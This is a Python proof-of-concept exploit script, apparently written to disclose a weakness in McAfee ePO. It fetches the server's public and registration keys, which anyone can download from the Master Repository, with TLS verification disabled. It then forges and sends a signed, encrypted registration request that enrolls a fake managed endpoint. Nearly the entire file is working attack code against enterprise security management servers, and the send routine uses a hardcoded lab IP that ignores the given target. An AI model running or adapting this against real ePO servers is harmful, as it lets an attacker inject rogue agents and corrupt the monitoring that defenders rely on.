#!/usr/bin/env python3
""" EPO Managed Endpoint Inject - Script to demonstrate weakness in EPO managed endpoint registration mechanism to allow arbitrary managed endpoint registration.
By design, McAfee ePO server exposes server public key and server registration key via Master Repository. These two keys can be downloaded by anyone and used to construct endpoint registration message or send events.
Tested and Confirmed on EPO 4.x/5.x
Harry Phung - harryuts\@\gmail.com
V1.0
"""
import struct
import mcafee_crypto
import endpoint
import socket
import argparse
from base64 import b64encode
import urllib.request
import ssl


class Build_Registration_Request:
    """Class for building registration request"""
    def __init__(self, epo_url, agent_guid, transaction_guid, agent_hostname, agent_mac_address):
        self.epo_url = epo_url
        self.agent_guid = agent_guid
        self.agent_hostname = agent_hostname
        self.transaction_guid = b'{%s}' % transaction_guid
        self.agent_mac_address = agent_mac_address
        self.serverkeyhash = b''
        self.regkey = b''
        self.header_1 = b''
        self.header_2 = b''
        self.fullprops_xml = b''
        self.register_request = b''
        self.agent_pubkey_epo_format = b''
        self.epo = None
        self.setup()

    def getfilehttps(self, url):
        """Download file via https"""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        response = urllib.request.urlopen(url, context=ctx)
        result = response.read()
        return result

    def setup(self):
        """Build server keyhash and generate agent key"""
        self.build_serverkeyhash()
        self.build_agent_pubkey()
        self.load_registration_key()

    def build_serverkeyhash(self):
        """Build server key hash based on server public key"""
        server_publickey = self.getfilehttps(self.epo_url + "srpubkey.bin")
        self.serverkeyhash = b64encode(mcafee_crypto.SHA1(server_publickey))
        return self.serverkeyhash

    def build_agent_pubkey(self):
        """Generate Agent Public Key"""
        self.agent_pubkey_epo_format = mcafee_crypto.generate_DSA_agentkey()

    def load_registration_key(self):
        """Build registration key to correct format expected by ePO"""
        key = self.getfilehttps(self.epo_url + "reqseckey.bin")
        reqseckey_p = int(key[2:130].hex(),16)
        reqseckey_q = int(key[132:152].hex(),16)
        reqseckey_g = int(key[154:282].hex(),16)
        reqseckey_pub = int(key[284:412].hex(),16)
        reqseckey_priv = int(key[415:435].hex(),16)
        dsa_key = (reqseckey_pub, reqseckey_g, reqseckey_p, reqseckey_q, reqseckey_priv)
        self.regkey = dsa_key

    def build_header_1(self, header_len=b'\x00\x00\x00\x00', data_len=b'\x00\x00\x00\x00'):
        """Build header 1 in request"""
        self.header_1 = b''
        header_1_dict = {'preamble': b'\x50\x4f',
                         'packet_type': b'\x01\x00\x00\x50',
                         'header_len': header_len + b'\x02\x00\x00\x00\x00\x00\x00\x00',
                         'data_len': data_len,
                         'agent_guid': b'{%s}' % self.agent_guid,
                         'agent_guid_padding': b'\x00' * 90 + b'\x01\x00\x00\x00',
                         'agent_hostname': b'%s' % self.agent_hostname,
                         'hostname_padding': b'\x00' * (32 - len(self.agent_hostname)) + b'\x00' * 48}

        for item in header_1_dict:
            self.header_1 += header_1_dict[item]
        return self.header_1

    def build_header_2_40(self):
        """Build header 2 in request"""
        self.header_2 = b'\x0e\x00\x00\x00AssignmentList\x01\x00\x00\x000' + \
                            (b'\x0c\x00\x00\x00ComputerName' + len(self.agent_hostname).to_bytes(4, 'little') + self.agent_hostname) + \
                            (b'\n\x00\x00\x00DomainName\t\x00\x00\x00WORKGROUP'
                             b'\x12\x00\x00\x00EventFilterVersion\x01\x00\x00\x000'
                             b'\x19\x00\x00\x00GuidRegenerationSupported\x01\x00\x00\x001'
                             b'\t\x00\x00\x00IPAddress\x0f\x00\x00\x00192.168.236.199') + \
                             b'\n\x00\x00\x00NETAddress' + len(self.agent_mac_address).to_bytes(4, 'little') +self.agent_mac_address + \
                            (b'\x0b\x00\x00\x00PackageType\x0b\x00\x00\x00AgentPubKey'
                             b'\n\x00\x00\x00PlatformID\n\x00\x00\x00W2KW:5:0:4'
                             b'\r\x00\x00\x00PolicyVersion\x01\x00\x00\x000'
                             b'\x0c\x00\x00\x00PropsVersion\x0e\x00\x00\x0020170724000500'
                             b'\x0e\x00\x00\x00SequenceNumber\x01\x00\x00\x003') + \
                             b'\r\x00\x00\x00ServerKeyHash' + len(self.serverkeyhash).to_bytes(4, 'little') + self.serverkeyhash + \
                            (b'\x0f\x00\x00\x00SiteinfoVersion\x01\x00\x00\x000'
                             b'\x15\x00\x00\x00SupportedSPIPEVersion\x0b\x00\x00\x003.0;4.0;5.0'
                             b'\x0b\x00\x00\x00TaskVersion\x01\x00\x00\x000') + \
                             b'\x0f\x00\x00\x00TransactionGUID' + len(self.transaction_guid).to_bytes(4, 'little') + self.transaction_guid
        return self.header_2

    def build_fullprops(self):
        """Build endpoint properties"""
        fullprops_xml = (b'<?xml version="1.0" encoding="UTF-8"?><ns:naiProperties xmlns:ns="naiProps" FullProps="true" PropsVersion="20170724000500" '
                         b'MachineID="{%s}" MachineName="%s">'
                         b'<ComputerProperties>'
                         b'<PlatformID>W2KW:5:0:4</PlatformID><ComputerName>%s</ComputerName>'
                         b'<ComputerDescription>N/A</ComputerDescription>'
                         b'<CPUType>Big Ass Mainframe</CPUType>'
                         b'<NumOfCPU>I dont know</NumOfCPU>'
                         b'<CPUSpeed>I got no idea</CPUSpeed>'
                         b'<OSType>Windows 2000</OSType>'
                         b'<OSBitMode>0</OSBitMode>'
                         b'<OSPlatform>Professional</OSPlatform>'
                         b'<OSVersion>5.0</OSVersion>'
                         b'<OSBuildNum>2195</OSBuildNum>'
                         b'<OSCsdVersion>Service Pack 4</OSCsdVersion>'
                         b'<TotalPhysicalMemory>2146938880</TotalPhysicalMemory>'
                         b'<FreeMemory>1896656896</FreeMemory>'
                         b'<TimeZone>Eastern Standard Time</TimeZone>'
                         b'<DefaultLangID>0409</DefaultLangID>'
                         b'<EmailAddress>W2KW</EmailAddress>'
                         b'<CPUSerialNumber>I dont know</CPUSerialNumber>'
                         b'<OSOEMId>51873-OEM-0003972-38082</OSOEMId>'
                         b'<LastUpdate>01/14/9999 20:05:00</LastUpdate>'
                         b'<UserName>Administrator</UserName>'
                         b'<DomainName>WORKGROUP</DomainName>'
                         b'<IPHostName>%s</IPHostName>'
                         b'<IPXAddress>N/A</IPXAddress>'
                         b'<Total_Space_of_Drive_C>20471.00</Total_Space_of_Drive_C>'
                         b'<Free_Space_of_Drive_C>16777.00</Free_Space_of_Drive_C>'
                         b'<NumOfHardDrives>1</NumOfHardDrives>'
                         b'<TotalDiskSpace>20471.00</TotalDiskSpace>'
                         b'<FreeDiskSpace>16777.00</FreeDiskSpace>'
                         b'<IPAddress>192.168.236.199</IPAddress>'
                         b'<SubnetAddress>192.168.236.0</SubnetAddress>'
                         b'<SubnetMask>255.255.255.0</SubnetMask>'
                         b'<NETAddress>000C2923AC18</NETAddress>'
                         b'<IsPortable>0</IsPortable>'
                         b'</ComputerProperties>'
                         b'<ProductProperties SoftwareID="PCR_____1000" delete="false">'
                         b'<Section name="General">'
                         b'<Setting name="szInstallDir">C:\\Program Files\\McAfee\\Common Framework</Setting>'
                         b'<Setting name="PluginVersion">9.0.0.1532</Setting>'
                         b'<Setting name="Language">0000</Setting>'
                         b'</Section>'
                         b'</ProductProperties><ProductProperties SoftwareID="EPOAGENT3000" delete="false">'
                         b'<Section name="General">'
                         b'<Setting name="szInstallDir">C:\\Program Files\\McAfee\\Common Framework</Setting>'
                         b'<Setting name="PluginVersion">9.0.0.1532</Setting>'
                         b'<Setting name="Language">0409</Setting>'
                         b'<Setting name="ServerKeyHash">%s</Setting>'
                         b'<Setting name="AgentGUID">{%s}</Setting>'
                         b'<Setting name="szProductVer">9.0.0.1532</Setting>'
                         b'<Setting name="bEnableSuperAgent">0</Setting>'
                         b'<Setting name="bEnableSuperAgentRepository">0</Setting>'
                         b'<Setting name="VirtualDirectory"></Setting>'
                         b'<Setting name="bEnableAgentPing">1</Setting>'
                         b'<Setting name="AgentBroadcastPingPort">8082</Setting>'
                         b'<Setting name="AgentPingPort">8081</Setting>'
                         b'<Setting name="ShowAgentUI">0</Setting>'
                         b'<Setting name="ShowRebootUI">1</Setting>'
                         b'<Setting name="RebootTimeOut">-1</Setting>'
                         b'<Setting name="PolicyEnforcementInterval">5</Setting>'
                         b'<Setting name="CheckNetworkMessageInterval">60</Setting>'
                         b'</Section>'
                         b'</ProductProperties>'
                         b'</ns:naiProperties>' \
                         % (self.agent_guid, self.agent_hostname, self.agent_hostname, self.agent_hostname, self.serverkeyhash, self.agent_guid))
        self.fullprops_xml = b'\x02\x00\x09\x00' + b'Props.xml' + struct.pack('<I', len(fullprops_xml)) + fullprops_xml
        return self.fullprops_xml

    def build_request(self):
        """Build registration request data. """
        self.build_header_2_40()
        self.build_fullprops()
        data_compressed = mcafee_crypto.mcafee_compress(self.agent_pubkey_epo_format + self.fullprops_xml)
        data_len = struct.pack('<I', len(data_compressed))
        final_header_len = struct.pack('<I', len(self.build_header_1()) + len(self.build_header_2_40()))
        self.build_header_1(final_header_len, data_len)
        final_header_1 = mcafee_crypto.xor_c(self.header_1)
        request_signature = mcafee_crypto.dsa_sign(self.regkey, self.header_1 + self.header_2 + data_compressed)
        data_encrypted = mcafee_crypto.mcafee_3des_encrypt(self.header_2 + data_compressed + request_signature)
        post_data = mcafee_crypto.xor_c(final_header_1) + data_encrypted
        return post_data

    def send_request(self):
        post_data = self.build_request()
        http_req = b'POST /spipe/pkg?AgentGuid={%s}' % self.agent_guid \
                   + b'&Source=Agent_3.0.0 HTTP/1.0\r\nAccept: application/octet-stream\r\nAccept-Language: en-us\r\n' \
                   + b'User-Agent: Mozilla/4.0 (compatible; SPIPE/3.0; Windows)\r\nHost: EPO59.laptoplab.local\r\n' \
                   + b'Content-Length: %d\r\nContent-Type: application/octet-stream\r\n\r\n' % len(post_data) \
                   + post_data
        try:
            self.epo = socket.socket()
            self.epo = ssl.wrap_socket(self.epo)
            self.epo.settimeout(1)
            print(self.agent_hostname)
            self.epo.connect(('192.168.0.245', 443))
            self.epo.send(http_req)
        except socket.error:
            print('Error connect to ePo server')

        try:
            receive_data = self.epo.recv(8192)
            if len(receive_data) > 0:
                server_response_code = receive_data[0: receive_data.find(b'\r\n')]
                print(server_response_code)
            else:
                print('Server closes the connection')
        except socket.error:
            print('socket error')


def main():
    parser = argparse.ArgumentParser(description='Python EPO Agent')
    parser.add_argument('target', type=str, help='Target EPO Server or Agent Handler IP Address')
    parser.add_argument('--port', type=int, default=443, help='Secure ASIC Port, default=443')
    # parser.add_argument('action', choices=['Register'], help='Action to perform. Supported Action: Register')
    args = parser.parse_args()
    epo_port = args.port
    epo_url = "https://{}:{}/Software/Current/EPOAGENT3000/Install/0409/".format(args.target, epo_port)
    guid = endpoint.generate_GUID().encode()
    hostname = endpoint.generate_hostname().encode()
    mac_address = endpoint.generate_MAC().encode()
    print("Registering endpoint: {}".format(hostname.decode()))
    a = Build_Registration_Request(epo_url, guid, guid,  hostname, mac_address)
    a.send_request()


if __name__ == "__main__":
    main()
        
    



